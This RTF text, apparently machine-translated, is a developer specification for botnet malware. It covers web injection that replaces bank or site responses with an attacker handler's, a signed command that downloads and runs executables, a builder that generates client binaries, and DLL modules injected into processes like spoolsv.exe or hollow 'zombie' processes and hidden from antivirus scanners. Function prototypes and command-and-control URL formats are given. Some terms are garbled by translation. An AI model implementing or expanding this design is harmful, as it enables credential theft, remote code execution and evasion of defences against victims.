The original request to the original server must be modified so that it becomes a GET request with a URI of "/", remove the header with cookies and other specific tags, then send to the original server.\par
After receiving the response from the original server, in the AfterReceiveResponse column, you must wait for the response from the server-handler to arrive. After that replace the original server's response (header and body) with the response from the server-handler.\par
Among other things, the handler server response can contain one special tag named "sinjdsto", which contains a numeric value. The presence of this chider in the handler server response means that the static inject should be switched from the "on" to the "off" state. The numeric value indicates the number of seconds after which the static injector will automatically switch from the "off" to the "ready" state. When replacing the response of the original server with the response of the handler server, the "sinjdsto" header must be removed. \par
The implication is that all trigger masks (and therefore trigger masks) do not overlap each other in the static injector config. The implication is that the link in the CheckURL column will only trigger on one trigger mask, and the link in the BeforeSendRequest column will only trigger on one trigger mask. Otherwise, it is up to the developer to resolve the situation. It is understood that the author of the config will take care of the uniqueness of the masks in the "sinj" tags.\par
If the AfterReceiveResponse collab knows that the request was handled by a static injection, it should not be handled by a dynamic injection. Thus, static injections have priority over dynamic injections.\cf1\par
\b 10.6 \cf0\b0\par
\cf1\b 10.7 \b0 The startup configuration of the file is \cf0\par
\b 10.8 \b0 The file launch config in the alternative scheme is a block encoded in base64 with information about where to download the file and how to start it. After decoding the config, which is a normal base64 encoded string, you should get the following block of binary data:\par
flags are DWORD type, are not used in the current implementation and always equal to zero. \par
SHA256 hash of the executable file, 32 byte block of binary data, \par
WORD - the length of the link to download the file,\par
AnsiString - file download link \par
Sign - digital signature of the config.\par
\b 10.8.1 \b0 When receiving an incoming command /42/ the client must decode its parameter from base64 and receive a block of binary data. After that he must check the length of the download link and the size of the remaining block where the digital signature must be. The digital signature always has a fixed size. If the checks fail then it has to report back to the server the result of the command with code 2. \par
\b 10.8.2 \b0 If the checks were successful, you must check the validity of the digital signature. If the digital signature is not valid, you must report to the server the result of the command with code 3. \par
\b 10.8.3 \b0 After successful verification of the digital signature the executable file must be downloaded from the link. If the download is successful, you should check the file by SHA256 hash. If the download is unsuccessful, it should be repeated 3 times with an interval of 15 seconds. If you failed to download the file after all the attempts, you must report to the server about the result of the command with code 4. \par
\b 10.8.4 \b0 If after downloading a file its hash does not match the one received from the server, it is necessary to report to the server about the result of the command with the code 5.\par
\b 10.8.5 \b0 If the hash check was successful, run the executable file. If the system function returns an error, then you must report to the server the result of the command with code 6. \par
\par
\b Builder\par
1\b0  The builder must have the following functionality\par
\b 1.1 \b0 Generate a key pair (private key) for the config. The key is binary compatible with BCRYPT_ECDSA_P384_ALGORITHM from Microsoft's CNG library. The output is two files with public and private key in binary form without transformations.\par
\b 1.2 \b0 Pack an arbitrary file into a universal signed config. Input: original file, config private key. Output: a file which contains a universal signed config\par
\b 1.3 \b0 Extract original data from a signed universal config with or without validation against the public key of the config. Input: universal signed config, public key of the config (if file validation is required). Output: original file\par
\b 1.4 \b0 Decrypt universal signed config. The output should be a file with an 8-byte chider, original data, and a digital signature. Input: universal signed config. Output: a file with an 8-byte chider and a signature\par
\b 1.5 \b0 Check server operability by ip-address and port pair. Input data: config public key, ip:port of the server.\par
\b 1.6 \b0 Same as point 1.5, but by server list. Input data: config public key, list of ip:port servers.\b\par
1.7 \b0 Generate client. Input: public config key, main client config, original executable client template file. On output: exe-file\b\par
2 \b0 The builder must be designed as a GUI application for Windows or Linux.\par
\par
\par
\b Modules for Windows\b0\par
\b 1\b0  A module for Windows is a DLL with several exportable functions.  The DLL can be loaded into an already running process, or it can be loaded into a specially created zombie process. There is one important condition: the body of the module is never saved to disk in an open form, even when it is directly run. For long-term storage of modules, they should be stored in a universally signed config (in the form in which they were downloaded from the server) or in some other form to prevent automatic scanners from searching for the module.\par
\b 2 \b0 The module is requested the first time it is used from the module server, via the /5/ command by its full name. It is located inside the universal signed config. After a successful download, the module is requested again every 72 hours. If the module update attempt fails, it must be repeated after 30 minutes. The very first request for a module from the module server must be made at the time of first use on the bot.\par
\b 3 \b0 Each module has an inherent property - a name. The name of a module contains only English letters. Any module always contains two versions: 32-bit and 64-bit. When you download a module from the server you have to specify its name and add "32" or "64". For example, the name of the module is "qwerty", then the 32-bit version is named "qwerty32", and the 64-bit version is named "qwerty64". The name of the module with "32" or "64" added to it is its full name. An example of a query for the 32-bit version of module "xyz" is /test1/QWERTY_W617600.11223344556677889900AABBCCDDEEFF/5/xyz32/. \par
\b 4\b0  Only 64-bit versions of modules are run on a 64-bit system. Thus, the 64-bit version of the upstream logic requests only 64-bit versions of modules, the 32-bit version of the upstream logic requests only 32-bit versions of modules.\par
\b 5 \b0 The module always works in only one instance\cf1 .\cf0\par
\b 6 \b0 The module exports the following functions: Start, Control, Release, FreeBuffer. All functions have stdcall conversion and are exported by name.\par
\b 6.1 \b0 The Start function has the following prototype:\par
\f1 PVOID Start(\par
\tab LPCSTR ModuleName,\tab\par
\tab LPCBYTE Arg,\par
\tab SIZE_T ArgLen,\par
\tab LPSTR ResultInfo,\par
\tab const ParentInfo* pParentData,\par
\tab PVOID EventCallback,\par
\tab PVOID EventCallbackContext,\par
\tab PVOID Reserved1);\f0\par
The function is called when a ctl "start" is received from the server\par
ModuleName - module name\par
Arg - start command argument\par
ArgLen - the size of the CtlArg parameter in bytes\par
ResultInfo is a buffer for the resulting ctl string. The buffer has a fixed length of 1024 bytes\par
pParentData - information about the upstream logic, controlled by the module's config\par
EventCallback - pointer to the event handler function.\par
EventCallbackContext is a pointer parameter that should be passed to the handler from the module.\par
The function, if successful, returns a descriptor that must be used when calling the Control and Release functions. If unsuccessful, the function returns zero.\par
\par
\f1 typedef struct struct ParentInfo \{\par
\tab CHAR ParentID[256];\par
\tab CHAR ParentGroup[\f2 64\f1 ];\par
\f2\tab\f1 CHAR SelfIP[\f2 64\f1 ];\par
\tab LPCWSTR ParentFiles;\par
\} ;\par
\f0 ParentID - full client ID of the above logic\par
ParentGroup - the grouping tag of the above logic\par
SelfIP - external IP address \par
ParentFiles - not used\par
The fields in the structure are filled by the bot depending on its config (tag <needinfo>).\par
\b 6.2 \b0 The Control function has the following prototype\par
\f1 BOOL Control (\par
\tab PVOID ModuleHandle,\par
\tab LPCSTR Ctl,\tab\par
\tab LPCBYTE CtlArg,\par
\tab SIZE_T CtlArgLen,\par
\tab LPSTR CtlResultInfo,\par
\tab PVOID* ppOutData,\par
\tab PDWORD pOutDataSize,\par
\tab LPCSTR pOutDataTag,\tab\par
\tab PVOID Reserved1);\cf1\f0\par
\cf0 The function is called when a ctl other than "start" and "release" is received from the server\par
ModuleHandle is the module descriptor returned by the Start function.\par
Ctl - the string containing the ctl to the module\par
CtlArg - ctl argument to a module\par
CtlArgLen - the size of the CtlArg parameter in bytes\par
ResultInfo is a buffer for the resulting ctl string. The buffer has a fixed length of 1024 bytes\par
ppOutData - pointer to a variable in which the pointer to the ctl output data buffer will be saved (ctl_OutData)\par
pOutDataSize - pointer to a variable in which the size of the data in the ctl output data buffer will be saved\par
pOutDataTag - buffer for the auxiliary tag to be sent to the server. The buffer has a fixed length of 128 bytes\par
The function returns TRUE if successful, otherwise it returns FALSE. In case of success if the value of *ppOutData after the call is not equal to zero, then this buffer must be freed via the FreeBuffer function \par
\b 6.3 \b0 The Release function has the following prototype\par
VOID Release (\par
\tab PVOID ModuleHandle);\par
The function realizes the complete shutdown of the module. Its task is to delete all the resources used during the module's work. The function is called when a "release" command is received from the server.\par
\b 6.4 \b0 The FreeBuffer function has the following prototype\par
VOID FreeBuffer (\par
\tab PVOID pMemory);\par
The function releases the buffer allocated inside the Control function (parameter ppOutData).\par
\b 6.5 \b0 The event handler has the following prototype\par
\f2 VOID EventCallback \f1 (\par
\tab PVOID ModuleHandle,\par
\tab LPCSTR \f2 EventName\f1 ,\tab\par
\tab LPCSTR \f2 EventInfo\f1 ,\par
\tab PVOID pOutData,\par
\tab DWORD OutDataSize,\par
\tab LPCSTR pOutDataTag,\tab\par
\tab PVOID \f2 Context\f1 );\cf1\f0\par
\cf0 ModuleHandle is the module descriptor that the Start function returned.\par
EventName - string containing event name. Maximum length is 128 bytes, the excess must be cut off\par
EventInfo - buffer with a string associated with the event. Maximum length is 1024 bytes, the excess must be cut off.\par
pOutData - pointer to the buffer with the data block, which will be sent to the server\par
OutDataSize - the size of the data in the pOutData buffer \par
pOutDataTag - buffer for auxiliary tag to be sent to server. Maximum length is 128 bytes, the excess must be cut off\par
Context - value copied by the module from the EventCallbackContext parameter in the Start function\par
For security reasons, the Context parameter must be checked for validity, whereby the higher-level logic must maintain an array of matching ModuleHadle=Context pairs. Alternatively, you can use only one Context value at all.\b\par
7\b0  The module somewhere in the middle of its body contains its config. The config is an ANSI encoded xml, framed at the end with the tags "<moduleconfig>" and "</moduleconfig>". The config is intended only for the above logic and has the following format:\par
\f1 <moduleconfig>.\par
<autostart>yes</autostart>\par
<autocontrol>.\par
<control ctl="test1" arg="cXdlcnR5MTIzNDU2Nzg5MA=="/>\par
<control ctl="test2" arg="cXdlcnR5MTIzNDU2Nzg5MA=="/>\par
</autocontrol>.\par
<processname>spoolsv.exe</processname>\par
<needinfo name="id"/>\par
<needinfo name="ip"/>\par
<needinfo name="parentfiles"/>\par
<autoconf>.\par
<conf ctl="test1" file="qwerty" period="30"/>\par
<conf ctl="test2" file="\f2 123456\f1 " period="180"/>\par
</autoconf>.\par
</moduleconfig> \f0\par
If the <autostart> tag is set and it is "yes", the module is started automatically after each start of the above logic.\par
If the <autocontrol> tag is set, then after calling the Start function, you must immediately call the Control function in order with specified crl and arg in the <control> tags. The value of arg attribute must be decoded from base64 before being passed to Control function.\par
If the <processname> tag is specified, the module must be run in the context of a running process with the specified name. If there is no such process, the module is not started. If there is more than one such process, the module is started in the context of the first one. If there is no <processname> tag, the module is started in a zombie process.\cf1\par
\cf0 If the <autoconf> tag is specified, the module must pass the contents of configs from the server. The content of the config is transmitted via the CtlArg parameter of the Control function, before transmitting the config is checked by the digital signature and decrypted. The maximum size of the config after decryption is 8 MB. The "file" attribute specifies the file name on the server, the file is requested with the /5/ command. The "period" attribute specifies the period for receiving the config file from the server in minutes. If in the process of getting the file from the server there was an error (server is unavailable, or the file was not decrypted or checked by digital signature), then the attempt is repeated after 30 seconds. If there are more than 5 unsuccessful attempts to get a config, it is a signal to the higher logic that it needs to change the server. The first transfer of configs to a module must take place immediately after calling the Start function, \i before \i0 calling the ctl specified in the <autocontrol> tag. Thus, first autoconf and then autocontrol.\par
If you specify a needinfo tag with a name attribute equal to "id" in the ParentInfo structure passed to the Start function, the ParentID and ParentGroup fields are populated. If you specify a needinfo tag with a name attribute equal to "ip" in the ParentInfo structure passed to the Start function, the ParentIP field is populated. \par
After updating the module's body, the parameters of its config are also updated.\par
\b 7.1 \b0 If a module is marked as autorun, it should be started before communication with the server starts, as early as possible, after the above logic is started. \par
WARNING: If <autoconf> tags are specified \i and \i0 there is no connection to the server (yet) \i and no configs have ever been transmitted to the module\i0 , the configs that were requested on the last successful attempt must be transmitted. In this regard, the higher-level logic should store the contents of the configs, after each successful request from the server (and after successful decryption and digital signature verification). If there are none either, no data is transmitted.\par
\b 8 \b0 The module is controlled through the command /62/. After executing any ctl except "release" the client must report to the server about its results. If ctl is different from start" and "release", then Control function is called. Before passing argument to Start or Control function it must be decoded from base64.\par
The results are reported with the command /63/. If the Start or Control function returns 0 or FALSE, this is reported with the /14/ command.\par
The report through the command /14/ is in the format /14/<module name>/<ctl> <reason>/, where module name is the name of the module with the suffix "32"/"64", ctl is the name of ctl. The reason is specified as a string briefly (the contents of the reason line is at the developer's discretion, the main requirements are to be brief and informative). For example, /14/xyz64/start fail/ - when working with the xyz64 module the start function returned zero, /14/xyz32/getinfo no_instance/ when working with the xyz2 module the ctl function getinfo could not be executed, because the process with the module was killed.\par
\b 8.1\b0  With ctl="start" the following situations are possible:\cf1\par

\pard{\pntext\f4\'B7\tab}{\*\pn\pnlvlblt\pnf4\pnindent360{\pntxtb\'B7}}\fi-360\sa200\sl276\slmult1\cf0\ul The module was not started \ulnone - in this case the module is loaded into the target process\par
{\pntext\f4\'B7\tab}\ul The module has been started, but its process no longer exists \ulnone - in this case the module is loaded into the target process (if the processname tag is specified in the module config, no action is taken) and the Start function is called.\par
{\pntext\f4\'B7\tab}\ul The module has been started and its process exists \ulnone - if a processname tag is specified in the module's config, the Release function is called, after which the Start function is called again. If no processname tag is specified, the Release function is called, then the zombie process is destroyed, a new zombie process is created and the Start function is called again.\par

\pard{\pntext\f4\'B7\tab}{\*\pn\pnlvlblt\pnf4\pnindent360{\pntxtb\'B7}}\sa200\sl276\slmult1\b 8.2\b0  With ctl="release" the following situations are possible:\cf1\par

\pard{\pntext\f4\'B7\tab}{\*\pn\pnlvlblt\pnf4\pnindent360{\pntxtb\'B7}}\fi-360\sa200\sl276\slmult1\cf0\ul The module was not started \ulnone - in this case no action is performed\par
{\pntext\f4\'B7\tab}\ul The module was started, but its process no longer exists \ulnone - in this case no action is taken, all structures and data associated with the module are cleared and it is considered that it was not started\par
{\pntext\f4\'B7\tab}\ul The module has been started and its process exists - \ulnone if the processname tag is specified in the module's config, the module's Release function is called and no further action is taken. If no processname tag is specified, the Release function is called, and then the zombie process is killed\par

\pard{\pntext\f4\'B7\tab}{\*\pn\pnlvlblt\pnf4\pnindent360{\pntxtb\'B7}}\sa200\sl276\slmult1\b 8.3\b0  With ctl not equal to "release" and "start" the following situations are possible:\cf1\par

\pard{\pntext\f4\'B7\tab}{\*\pn\pnlvlblt\pnf4\pnindent360{\pntxtb\'B7}}\fi-360\sa200\sl276\slmult1\cf0\ul The module was not started \ulnone - in this case no action is taken, a report is sent to the server through the command /14/.\par
{\pntext\f4\'B7\tab}\ul The module was started, but its process no longer exists \ulnone - in this case no action is taken, all structures and data associated with the module are cleared and it is considered that it was not started. A report is sent to the server through the command /14/\par
{\pntext\f4\'B7\tab}\ul The module has been started and its process exists - \ulnone the Control function is called with stl and the arguments passed.\par
}
 